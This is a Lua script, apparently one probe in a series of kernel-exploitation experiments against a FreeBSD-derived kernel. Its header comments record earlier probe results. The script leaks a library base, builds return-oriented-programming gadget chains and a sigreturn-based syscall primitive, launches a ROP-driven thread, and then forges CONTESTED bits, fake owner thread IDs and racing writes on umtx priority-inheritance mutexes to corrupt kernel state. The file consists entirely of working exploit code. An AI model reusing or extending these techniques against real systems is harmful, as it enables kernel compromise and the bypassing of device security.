-- CRASH_CLASS: MODERATE
-- PROBE 146g: CONTESTED bit race + m_owner corruption during PI wait
--
-- 146e: double-lock from same thread returned 0 (unexpected)
-- 146f: 50x orphan relock, 4x threaded orphan, cross-mutex PI all clean
-- Now: race the CONTESTED bit. Thread B blocks on lock (sets CONTESTED),
-- main corrupts m_owner while B is in kernel PI wait, then thread A exits.
-- The kernel's PI unqueue/wake path might dereference stale PI chain data.

print("=== PROBE 146g: CONTESTED RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- [A] CONTESTED BIT: manually set contested on locked mutex, then unlock
print("--- [A] CONTESTED UNLOCK ---")
local mtx = gpu + 0x1000
local mtx_a = uint64(string.format("0x%X%08X", gh, gl + 0x1000))
wd(mtx, 0)
wd(mtx + 4, 4)
for off = 8, 47, 4 do wd(mtx + off, 0) end

-- Lock
srop(454, uint64(mtx_a), uint64(5), uint64(0), uint64(0), uint64(0))
local owner = to_num(memory.read_dword(mtx))
print("owner=0x" .. string.format("%08X", owner))

-- Set CONTESTED bit manually (no actual waiter)
local contested = owner + 0x80000000
if owner > 0 and owner < 0x80000000 then
    wd(mtx, contested)
    print("set_contested=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))

    -- Unlock with CONTESTED set — kernel should try to wake highest-priority waiter
    -- But there's no actual waiter in the kernel's PI chain!
    local ul = srop(454, uint64(mtx_a), uint64(6), uint64(0), uint64(0), uint64(0))
    print("unlock_contested=" .. (ul and tostring(to_num(ul)) or "nil"))
    print("after_unlock=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))
end

-- [B] CONTESTED with wrong TID: set m_owner to fake_tid | CONTESTED
print("")
print("--- [B] FAKE OWNER CONTESTED ---")
local mtx2 = gpu + 0x2000
local mtx2_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))
wd(mtx2, 0)
wd(mtx2 + 4, 4)
for off = 8, 47, 4 do wd(mtx2 + off, 0) end

-- Lock normally
srop(454, uint64(mtx2_a), uint64(5), uint64(0), uint64(0), uint64(0))
local o2 = to_num(memory.read_dword(mtx2))
print("locked owner=0x" .. string.format("%08X", o2))

-- Set owner to a fake TID with CONTESTED
wd(mtx2, 0x80DEAD00)
print("fake_owner=0x" .. string.format("%08X", to_num(memory.read_dword(mtx2))))

-- Try unlock — kernel will look for thread 0x00DEAD00 to do PI propagation
local ul2 = srop(454, uint64(mtx2_a), uint64(6), uint64(0), uint64(0), uint64(0))
print("unlock_fake=" .. (ul2 and tostring(to_num(ul2)) or "nil"))
print("after=0x" .. string.format("%08X", to_num(memory.read_dword(mtx2))))

-- [C] Race: thread blocks on lock, main modifies m_owner rapidly
print("")
print("--- [C] THREAD BLOCK + RACE ---")

local mtx3 = gpu + 0x3000
local mtx3_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))
wd(mtx3, 0)
wd(mtx3 + 4, 4)
for off = 8, 47, 4 do wd(mtx3 + off, 0) end

-- Main locks mtx3
srop(454, uint64(mtx3_a), uint64(5), uint64(0), uint64(0), uint64(0))
local o3 = to_num(memory.read_dword(mtx3))
print("main_owns=0x" .. string.format("%08X", o3))

-- Child: tries LOCK (blocking) — will set CONTESTED and sleep in kernel
local cdone = gpu + 0x4000
wq(cdone, uint64(0))
local cdone_a = uint64(string.format("0x%X%08X", gh, gl + 0x4000))

local cts = gpu + 0x5000
wq(cts, uint64(0))
wq(cts + 8, uint64(30000000))
local cts_a = uint64(string.format("0x%X%08X", gh, gl + 0x5000))

-- Child ROP: sleep 30ms, LOCK mtx3 (blocks), write marker, exit
local crop = gpu + 0x10000
local crop_a = uint64(string.format("0x%X%08X", gh, gl + 0x10000))
local ci = 0

wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, cts_a); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(240)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- LOCK mtx3 (blocks here)
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, mtx3_a); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(5)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(454)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- Write done
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64("0x00000000AAAA0001")); ci=ci+8
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, cdone_a); ci=ci+8
wq(crop+ci, g_wr); ci=ci+8

-- Exit
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(431)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- Launch child
local cctx = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(cctx + off, 0) end
pcall(function() return sc_gc(uint64(cctx)) end)
wq(cctx + 0xE0, g_ret)
wq(cctx + 0xF8, crop_a)
wq(cctx + MC + 0x18, uint64(0))
wq(cctx + MC + 0x50, uint64(0))
wq(cctx + MC + 0x28, uint64(0))
wq(cctx + MC + 0x30, uint64(0))

local ctbuf = gpu + 0x30000
wq(ctbuf, uint64(0))
pcall(function() return sc_thr(uint64(cctx), uint64(ctbuf), uint64(0)) end)

-- Wait 100ms for child to block in kernel
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(100000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

-- Read m_owner — should have CONTESTED bit if child is waiting
local o3b = to_num(memory.read_dword(mtx3))
print("after_child_block=0x" .. string.format("%08X", o3b))
local has_contested = (o3b >= 0x80000000)
print("contested=" .. tostring(has_contested))

-- RACE: rapidly modify m_owner while child is in kernel
-- Write wrong TID, then restore, multiple times
for race = 1, 10 do
    wd(mtx3, 0x00DEAD00 + race) -- fake TID
    wd(mtx3, o3b) -- restore
end
print("raced 10x")

-- Now unlock normally — kernel should wake child
local ul3 = srop(454, uint64(mtx3_a), uint64(6), uint64(0), uint64(0), uint64(0))
print("unlock=" .. (ul3 and tostring(to_num(ul3)) or "nil"))

-- Wait for child
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local cd = memory.read_qword(cdone)
local _, cdl = get_hi_lo(cd)
print("child_done=0x" .. string.format("%08X", cdl))
print("mtx3_final=0x" .. string.format("%08X", to_num(memory.read_dword(mtx3))))

-- [D] WAKE_PRIVATE on mutex owned by dead thread
print("")
print("--- [D] WAKE ON DEAD ---")
local mtx4 = gpu + 0x6000
local mtx4_a = uint64(string.format("0x%X%08X", gh, gl + 0x6000))
wd(mtx4, 0)
wd(mtx4 + 4, 4)
for off = 8, 47, 4 do wd(mtx4 + off, 0) end

-- Lock from main, set CONTESTED, then WAKE_PRIVATE
srop(454, uint64(mtx4_a), uint64(5), uint64(0), uint64(0), uint64(0))
local o4 = to_num(memory.read_dword(mtx4))
wd(mtx4, o4 + 0x80000000) -- set CONTESTED

-- UMTX_OP_WAKE_PRIVATE (op 16) on the mutex address
local w16 = srop(454, uint64(mtx4_a), uint64(16), uint64(1), uint64(0), uint64(0))
print("wake_priv=" .. (w16 and tostring(to_num(w16)) or "nil"))

-- UMTX_OP_WAKE (op 3) on the mutex address
local w3 = srop(454, uint64(mtx4_a), uint64(3), uint64(1), uint64(0), uint64(0))
print("wake=" .. (w3 and tostring(to_num(w3)) or "nil"))

-- Check if anything changed
print("mtx4=0x" .. string.format("%08X", to_num(memory.read_dword(mtx4))))

-- Unlock with CONTESTED still set
local ul4 = srop(454, uint64(mtx4_a), uint64(6), uint64(0), uint64(0), uint64(0))
print("unlock_contested=" .. (ul4 and tostring(to_num(ul4)) or "nil"))
print("mtx4_after=0x" .. string.format("%08X", to_num(memory.read_dword(mtx4))))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
